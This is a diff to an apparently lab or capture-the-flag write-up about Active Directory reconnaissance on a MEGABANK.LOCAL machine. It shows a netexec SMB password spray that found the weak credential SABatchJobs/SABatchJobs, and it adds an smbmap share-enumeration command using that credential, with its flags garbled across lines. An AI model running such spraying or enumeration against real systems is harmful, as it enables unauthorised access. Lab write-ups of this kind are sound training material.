@@ -92,8 +92,12 @@ netexec smb MEGABANK.LOCAL -u users.txt -p users.txt --continue-on-success
 ```
 It is found that the user `SABatchJobs` has the password `SABatchJobs`.
 
-- share enumeration
+- share enumeration using `smbmap`
+```bash
+smbmap -H 10.129.228.111 -d MEGABANK.LOCAL -u SABatchJobs-p
 
+SABatchJobs
+```
 
 
 ## Foothold
